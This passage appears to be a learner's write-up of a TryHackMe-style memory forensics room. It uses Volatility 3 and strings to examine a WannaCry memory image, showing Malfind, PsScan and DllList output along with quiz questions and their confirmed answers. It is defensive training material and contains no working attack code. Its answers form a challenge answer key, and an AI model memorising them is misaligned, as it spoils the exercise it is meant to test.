0x57a50002:	add	byte ptr [eax], al
0x57a50004:	add	byte ptr [eax], al
0x57a50006:	add	byte ptr [eax], al
0x57a50008:	add	byte ptr [eax], al
0x57a5000a:	add	byte ptr [eax], al
0x57a5000c:	add	byte ptr [eax], al
0x57a5000e:	add	byte ptr [eax], al
0x57a50010:	add	byte ptr [eax], al
0x57a50012:	add	byte ptr [eax], al
0x57a50014:	add	byte ptr [eax], al
0x57a50016:	add	byte ptr [eax], al
0x57a50018:	add	byte ptr [eax], al
0x57a5001a:	add	byte ptr [eax], al
0x57a5001c:	add	byte ptr [eax], al
0x57a5001e:	add	byte ptr [eax], al
0x57a50020:	add	byte ptr [eax], al
0x57a50022:	add	byte ptr [eax], al
0x57a50024:	add	byte ptr [eax], al
0x57a50026:	add	byte ptr [eax], al
0x57a50028:	add	byte ptr [eax], al
0x57a5002a:	add	byte ptr [eax], al
0x57a5002c:	add	byte ptr [eax], al
0x57a5002e:	add	byte ptr [eax], al
0x57a50030:	add	byte ptr [eax], al
0x57a50032:	add	byte ptr [eax], al
0x57a50034:	sub	al, 0
0x57a50036:	sub	al, 0
0x57a50038:	add	dword ptr [eax], eax
0x57a5003a:	add	byte ptr [eax], al
0x57a5003c:	add	byte ptr [eax], al
0x57a5003e:	add	byte ptr [eax], al
620	winlogon.exe	0x54aa0000	0x54aa3fff	VadS	PAGE_EXECUTE_READWRITE	4	1	Disabled	
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 27 00 27 00	....'.'.
01 00 00 00 00 00 00 00	........	
0x54aa0000:	add	byte ptr [eax], al
0x54aa0002:	add	byte ptr [eax], al
0x54aa0004:	add	byte ptr [eax], al
0x54aa0006:	add	byte ptr [eax], al
0x54aa0008:	add	byte ptr [eax], al
0x54aa000a:	add	byte ptr [eax], al
0x54aa000c:	add	byte ptr [eax], al
0x54aa000e:	add	byte ptr [eax], al
0x54aa0010:	add	byte ptr [eax], al
0x54aa0012:	add	byte ptr [eax], al
0x54aa0014:	add	byte ptr [eax], al
0x54aa0016:	add	byte ptr [eax], al
0x54aa0018:	add	byte ptr [eax], al
0x54aa001a:	add	byte ptr [eax], al
0x54aa001c:	add	byte ptr [eax], al
0x54aa001e:	add	byte ptr [eax], al
0x54aa0020:	add	byte ptr [eax], al
0x54aa0022:	add	byte ptr [eax], al
0x54aa0024:	add	byte ptr [eax], al
0x54aa0026:	add	byte ptr [eax], al
0x54aa0028:	add	byte ptr [eax], al
0x54aa002a:	add	byte ptr [eax], al
0x54aa002c:	add	byte ptr [eax], al
0x54aa002e:	add	byte ptr [eax], al
0x54aa0030:	add	byte ptr [eax], al
0x54aa0032:	add	byte ptr [eax], al
0x54aa0034:	daa	
0x54aa0035:	add	byte ptr [edi], ah
0x54aa0037:	add	byte ptr [ecx], al
0x54aa0039:	add	byte ptr [eax], al
0x54aa003b:	add	byte ptr [eax], al
0x54aa003d:	add	byte ptr [eax], al
620	winlogon.exe	0x755a0000	0x755a3fff	VadS	PAGE_EXECUTE_READWRITE	4	1	Disabled	
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 25 00 25 00	....%.%.
01 00 00 00 00 00 00 00	........	
0x755a0000:	add	byte ptr [eax], al
0x755a0002:	add	byte ptr [eax], al
0x755a0004:	add	byte ptr [eax], al
0x755a0006:	add	byte ptr [eax], al
0x755a0008:	add	byte ptr [eax], al
0x755a000a:	add	byte ptr [eax], al
0x755a000c:	add	byte ptr [eax], al
0x755a000e:	add	byte ptr [eax], al
0x755a0010:	add	byte ptr [eax], al
0x755a0012:	add	byte ptr [eax], al
0x755a0014:	add	byte ptr [eax], al
0x755a0016:	add	byte ptr [eax], al
0x755a0018:	add	byte ptr [eax], al
0x755a001a:	add	byte ptr [eax], al
0x755a001c:	add	byte ptr [eax], al
0x755a001e:	add	byte ptr [eax], al
0x755a0020:	add	byte ptr [eax], al
0x755a0022:	add	byte ptr [eax], al
0x755a0024:	add	byte ptr [eax], al
0x755a0026:	add	byte ptr [eax], al
0x755a0028:	add	byte ptr [eax], al
0x755a002a:	add	byte ptr [eax], al
0x755a002c:	add	byte ptr [eax], al
0x755a002e:	add	byte ptr [eax], al
0x755a0030:	add	byte ptr [eax], al
0x755a0032:	add	byte ptr [eax], al
0x755a0034:	and	eax, 0x1002500
0x755a0039:	add	byte ptr [eax], al
0x755a003b:	add	byte ptr [eax], al
0x755a003d:	add	byte ptr [eax], al
620	winlogon.exe	0x7f630000	0x7f633fff	VadS	PAGE_EXECUTE_READWRITE	4	1	Disabled	
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 23 00 23 00	....#.#.
01 00 00 00 00 00 00 00	........	
0x7f630000:	add	byte ptr [eax], al
0x7f630002:	add	byte ptr [eax], al
0x7f630004:	add	byte ptr [eax], al
0x7f630006:	add	byte ptr [eax], al
0x7f630008:	add	byte ptr [eax], al
0x7f63000a:	add	byte ptr [eax], al
0x7f63000c:	add	byte ptr [eax], al
0x7f63000e:	add	byte ptr [eax], al
0x7f630010:	add	byte ptr [eax], al
0x7f630012:	add	byte ptr [eax], al
0x7f630014:	add	byte ptr [eax], al
0x7f630016:	add	byte ptr [eax], al
0x7f630018:	add	byte ptr [eax], al
0x7f63001a:	add	byte ptr [eax], al
0x7f63001c:	add	byte ptr [eax], al
0x7f63001e:	add	byte ptr [eax], al
0x7f630020:	add	byte ptr [eax], al
0x7f630022:	add	byte ptr [eax], al
0x7f630024:	add	byte ptr [eax], al
0x7f630026:	add	byte ptr [eax], al
0x7f630028:	add	byte ptr [eax], al
0x7f63002a:	add	byte ptr [eax], al
0x7f63002c:	add	byte ptr [eax], al
0x7f63002e:	add	byte ptr [eax], al
0x7f630030:	add	byte ptr [eax], al
0x7f630032:	add	byte ptr [eax], al
0x7f630034:	and	eax, dword ptr [eax]
0x7f630036:	and	eax, dword ptr [eax]
0x7f630038:	add	dword ptr [eax], eax
0x7f63003a:	add	byte ptr [eax], al
0x7f63003c:	add	byte ptr [eax], al
0x7f63003e:	add	byte ptr [eax], al
```


#### `windows.psscan.PsScan`

Finally we will look at `PsScan`

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.psscan.PsScan
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished                        
PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	File output

860	1940	taskdl.exe	0x1f4daf0	0	-	0	False	2017-05-12 21:26:23.000000 	2017-05-12 21:26:23.000000 	Disabled
536	1940	taskse.exe	0x1f53d18	0	-	0	False	2017-05-12 21:26:22.000000 	2017-05-12 21:26:23.000000 	Disabled
424	1940	@WanaDecryptor@	0x1f69b50	0	-	0	False	2017-05-12 21:25:52.000000 	2017-05-12 21:25:53.000000 	Disabled
1768	1024	wuauclt.exe	0x1f747c0	7	132	0	False	2017-05-12 21:22:52.000000 	N/A	Disabled
576	1940	@WanaDecryptor@	0x1f8ba58	0	-	0	False	2017-05-12 21:26:22.000000 	2017-05-12 21:26:23.000000 	Disabled
260	664	svchost.exe	0x1fb95d8	5	105	0	False	2017-05-12 21:22:18.000000 	N/A	Disabled
740	1940	@WanaDecryptor@	0x1fde308	2	70	0	False	2017-05-12 21:22:22.000000 	N/A	Disabled
1168	1024	wscntfy.exe	0x1fea8a0	1	37	0	False	2017-05-12 21:22:56.000000 	N/A	Disabled
544	664	alg.exe	0x2010020	6	101	0	False	2017-05-12 21:22:55.000000 	N/A	Disabled
1084	664	svchost.exe	0x203b7a8	6	72	0	False	2017-05-12 21:22:03.000000 	N/A	Disabled
596	348	csrss.exe	0x2161da0	12	352	0	False	2017-05-12 21:22:00.000000 	N/A	Disabled
348	4	smss.exe	0x2169020	3	19	N/A	False	2017-05-12 21:21:55.000000 	N/A	Disabled
620	348	winlogon.exe	0x216e020	23	536	0	False	2017-05-12 21:22:01.000000 	N/A	Disabled
676	620	lsass.exe	0x2191658	23	353	0	False	2017-05-12 21:22:01.000000 	N/A	Disabled
664	620	services.exe	0x21937f0	15	265	0	False	2017-05-12 21:22:01.000000 	N/A	Disabled
1024	664	svchost.exe	0x21af7e8	79	1366	0	False	2017-05-12 21:22:03.000000 	N/A	Disabled
904	664	svchost.exe	0x21b5230	9	227	0	False	2017-05-12 21:22:03.000000 	N/A	Disabled
1152	664	svchost.exe	0x21bea78	10	173	0	False	2017-05-12 21:22:06.000000 	N/A	Disabled
1636	1608	explorer.exe	0x21d9da0	11	331	0	False	2017-05-12 21:22:10.000000 	N/A	Disabled
1484	664	spoolsv.exe	0x21e2da0	14	124	0	False	2017-05-12 21:22:09.000000 	N/A	Disabled
1940	1636	tasksche.exe	0x2218da0	7	51	0	False	2017-05-12 21:22:14.000000 	N/A	Disabled
836	664	svchost.exe	0x221a2c0	19	211	0	False	2017-05-12 21:22:02.000000 	N/A	Disabled
1956	1636	ctfmon.exe	0x2231da0	1	86	0	False	2017-05-12 21:22:14.000000 	N/A	Disabled
4	0	System	0x23c8830	51	244	N/A	False	N/A	N/A	Disabled
```

### Info

I mentioend previously it would be good to export these file.

We can run the command, 
`for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done`

We could look at it this way:
```Shell
for $plugin in {
    windows.malfind.Malfind _
    windows.psscan.PsScan _
    windows.pstree.PsTree _
    windows.pslist.PsList _
    windows.cmdline.CmdLine _
    windows.filescan.FileScan _
    windows.dlllist.DllList;
}
do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
```

For each of the plugin's, run that plug in then output the results to `wcry.%plugin%.txt. We would then have an output for each of the plugins.

Lets try this, before we start let's get the current directory listing

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# ls -la
total 524300
drwxrwxr-x 2 ubuntu ubuntu      4096 Sep 21  2024 .
drwxrwxr-x 4 ubuntu ubuntu      4096 Oct 14  2024 ..
-rw-rw-r-- 1 ubuntu ubuntu 536870912 May 13  2017 wcry.mem
```

Now, we will run the full command.

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
```

As we expect, since we are running on `-q` (quiet mode) we didn't get any output to screen

Now we can list the directory again and prove the files have been created

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# ls -la
total 524488
drwxrwxr-x 2 ubuntu ubuntu      4096 Jul  7 11:41 .
drwxrwxr-x 4 ubuntu ubuntu      4096 Oct 14  2024 ..
-rw-rw-r-- 1 ubuntu ubuntu 536870912 May 13  2017 wcry.mem
-rw-r--r-- 1 root   root        1382 Jul  7 11:41 wcry.windows.cmdline.CmdLine.txt
-rw-r--r-- 1 root   root       82525 Jul  7 11:41 wcry.windows.dlllist.DllList.txt
-rw-r--r-- 1 root   root       70235 Jul  7 11:41 wcry.windows.filescan.FileScan.txt
-rw-r--r-- 1 root   root       13510 Jul  7 11:40 wcry.windows.malfind.Malfind.txt
-rw-r--r-- 1 root   root        1833 Jul  7 11:41 wcry.windows.pslist.PsList.txt
-rw-r--r-- 1 root   root        2251 Jul  7 11:41 wcry.windows.psscan.PsScan.txt
-rw-r--r-- 1 root   root        1716 Jul  7 11:41 wcry.windows.pstree.PsTree.txt
```

### Preprocessing With Strings

We can use the `strings` command to extract strings from the file

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# strings wcry.mem > wcry.strings.ascii.txt
```

I Won't show the whole output as it is a large output, however, if we know we're looking for a specific string, we can grep the result. For example `THM`.

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# cat wcry.strings.ascii.txt  | grep THM
WmipTHM
E3 F4 F4 F4!E4!E4!E4!E4!E4"F5$J8'K:)M<*L;'I8'G6(E5/J:.H8.E6-D5/D50E63H96I:/B34G8;L?@QCFTHMZLU_S]dWtxm{}q
BEGINTHM
BEGINTHM
BEGINTHM
THM*
KEYEXCHANGEALGORITHMS
```

Another example is to extract 16-bit little endian strings

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# strings -e l  wcry.mem > wcry.strings.LittleEndian.txt
```

Lets try the THM exmaple again

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# cat wcry.strings.LittleEndian.txt | grep THM
STHMP3.dll
THMSG~1.WNC
```

Finally, we can do the same for Big Endian (`-e b`)

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# strings -e b  wcry.mem > wcry.strings.BigEndian.txt
```

Again, `cat` out THM

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# cat  wcry.strings.BigEndian.txt | grep THM
STHMP3.dll
```

This was a bad example, but you get the point.


### ❓ Question 1

> What plugin lists processes in a tree based on their parent process ID?

#### 🧪 Process

This was the first plugin we looked into `PsTree`.

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.pstree.PsTree
```

Trying This as the answer

#### ✅ Answer

- `PsTree` ✅


### ❓ Question 2

> What plugin is used to list all currently active processes in the machine?

#### 🧪 Process

This was the second plugin we looked into `PsList`

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.pslist.PsList
```

Trying this as the answer

#### ✅ Answer

- `PsList` ✅


### ❓ Question 3

> What Linux utility tool can extract the ASCII, 16-bit little-endian, and 16-bit big-endian strings?

#### 🧪 Process

We can use `strings` for this purpose

Trying this as the answer

#### ✅ Answer

- `strings` ✅


### ❓ Question 4 

> By running vol3 with the Malfind parameter, what is the first (1st) process identified suspected of having an injected code?

#### 🧪 Process

Since we already exported these to files we can just cat the result straight away

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# ls
wcry.mem                    wcry.strings.LittleEndian.txt  wcry.windows.cmdline.CmdLine.txt  wcry.windows.filescan.FileScan.txt  wcry.windows.pslist.PsList.txt  wcry.windows.pstree.PsTree.txt
wcry.strings.BigEndian.txt  wcry.strings.ascii.txt         wcry.windows.dlllist.DllList.txt  wcry.windows.malfind.Malfind.txt    wcry.windows.psscan.PsScan.txt
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# cat wcry.windows.malfind.Malfind.txt
Volatility 3 Framework 2.0.0

PID	Process	Start VPN	End VPN	Tag	Protection	CommitCharge	PrivateMemory	File output	Hexdump	Disasm

596	csrss.exe	0x7f6f0000	0x7f7effff	Vad 	PAGE_EXECUTE_READWRITE	0	0	Disabled	
c8 00 00 00 8b 01 00 00	........
ff ee ff ee 08 70 00 00	.....p..
08 00 00 00 00 fe 00 00	........
00 00 10 00 00 20 00 00	........
00 02 00 00 00 20 00 00	........
8d 01 00 00 ff ef fd 7f	........
03 00 08 06 00 00 00 00	........
00 00 00 00 00 00 00 00	........	
0x7f6f0000:	enter	0, 0
0x7f6f0004:	mov	eax, dword ptr [ecx]
0x7f6f0006:	add	byte ptr [eax], al
```

We can see that the first process is `csrss.exe`

Trying this as the answer

#### ✅ Answer

- `csrss.exe` ✅


### ❓ Question 5

> Continuing from the previous question (Question 6), what is the second (2nd) process identified suspected of having an injected code?

#### 🧪 Process

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# ls
wcry.mem                    wcry.strings.LittleEndian.txt  wcry.windows.cmdline.CmdLine.txt  wcry.windows.filescan.FileScan.txt  wcry.windows.pslist.PsList.txt  wcry.windows.pstree.PsTree.txt
wcry.strings.BigEndian.txt  wcry.strings.ascii.txt         wcry.windows.dlllist.DllList.txt  wcry.windows.malfind.Malfind.txt    wcry.windows.psscan.PsScan.txt
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# cat wcry.windows.malfind.Malfind.txt
Volatility 3 Framework 2.0.0

PID	Process	Start VPN	End VPN	Tag	Protection	CommitCharge	PrivateMemory	File output	Hexdump	Disasm

596	csrss.exe	0x7f6f0000	0x7f7effff	Vad 	PAGE_EXECUTE_READWRITE	0	0	Disabled	
[redacted]
620	winlogon.exe	0x21400000	0x21403fff	VadS	PAGE_EXECUTE_READWRITE	4	1	Disabled	
[redacted]
```

The second process is `winlogon.exe`.

Trying this as the answer


#### ✅ Answer

- `winlogon.exe` ✅


### ❓ Question 6 

> By running vol3 with the DllList parameter, what is the file path or directory of the binary @WanaDecryptor@.exe?

#### 🧪 Process

Using our previously exported file we can `cat` and `grep`.

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# cat wcry.windows.dlllist.DllList.txt | grep Wana
740	@WanaDecryptor@	0x400000	0x3d000	@WanaDecryptor@.exe	C:\Intel\ivecuqmanpnirkt615\@WanaDecryptor@.exe	N/A	Disabled
740	@WanaDecryptor@	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
740	@WanaDecryptor@	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
740	@WanaDecryptor@	0x73dd0000	0xf2000	MFC42.DLL	C:\WINDOWS\system32\MFC42.DLL	N/A	Disabled
740	@WanaDecryptor@	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
740	@WanaDecryptor@	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
740	@WanaDecryptor@	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
740	@WanaDecryptor@	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
740	@WanaDecryptor@	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
740	@WanaDecryptor@	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
740	@WanaDecryptor@	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
740	@WanaDecryptor@	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
740	@WanaDecryptor@	0x773d0000	0x103000	COMCTL32.dll	C:\WINDOWS\WinSxS\X86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\COMCTL32.dll	N/A	Disabled
740	@WanaDecryptor@	0x77120000	0x8b000	OLEAUT32.dll	C:\WINDOWS\system32\OLEAUT32.dll	N/A	Disabled
740	@WanaDecryptor@	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
740	@WanaDecryptor@	0x78130000	0x134000	urlmon.dll	C:\WINDOWS\system32\urlmon.dll	N/A	Disabled
740	@WanaDecryptor@	0x3dfd0000	0x1ec000	iertutil.dll	C:\WINDOWS\system32\iertutil.dll	N/A	Disabled
740	@WanaDecryptor@	0x76080000	0x65000	MSVCP60.dll	C:\WINDOWS\system32\MSVCP60.dll	N/A	Disabled
740	@WanaDecryptor@	0x71ab0000	0x17000	WS2_32.dll	C:\WINDOWS\system32\WS2_32.dll	N/A	Disabled
740	@WanaDecryptor@	0x71aa0000	0x8000	WS2HELP.dll	C:\WINDOWS\system32\WS2HELP.dll	N/A	Disabled
740	@WanaDecryptor@	0x3d930000	0xe7000	WININET.dll	C:\WINDOWS\system32\WININET.dll	N/A	Disabled
740	@WanaDecryptor@	0x340000	0x9000	Normaliz.dll	C:\WINDOWS\system32\Normaliz.dll	N/A	Disabled
740	@WanaDecryptor@	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
740	@WanaDecryptor@	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
740	@WanaDecryptor@	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
740	@WanaDecryptor@	0x732e0000	0x5000	RICHED32.DLL	C:\WINDOWS\system32\RICHED32.DLL	N/A	Disabled
740	@WanaDecryptor@	0x74e30000	0x6d000	RICHED20.dll	C:\WINDOWS\system32\RICHED20.dll	N/A	Disabled
740	@WanaDecryptor@	0x5ad70000	0x38000	uxtheme.dll	C:\WINDOWS\system32\uxtheme.dll	N/A	Disabled
740	@WanaDecryptor@	0x74720000	0x4c000	MSCTF.dll	C:\WINDOWS\system32\MSCTF.dll	N/A	Disabled
740	@WanaDecryptor@	0x755c0000	0x2e000	msctfime.ime	C:\WINDOWS\system32\msctfime.ime	N/A	Disabled
740	@WanaDecryptor@	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
740	@WanaDecryptor@	0xea0000	0x29000	msls31.dll	C:\WINDOWS\system32\msls31.dll	N/A	Disabled
```

Here we can see we have the following entry

```Text
740	@WanaDecryptor@	0x400000	0x3d000	@WanaDecryptor@.exe	C:\Intel\ivecuqmanpnirkt615\@WanaDecryptor@.exe	N/A	Disabled
```

Which gives us our answer `C:\Intel\ivecuqmanpnirkt615`

Trying this as the answer

#### ✅ Answer

- `C:\Intel\ivecuqmanpnirkt615` ✅
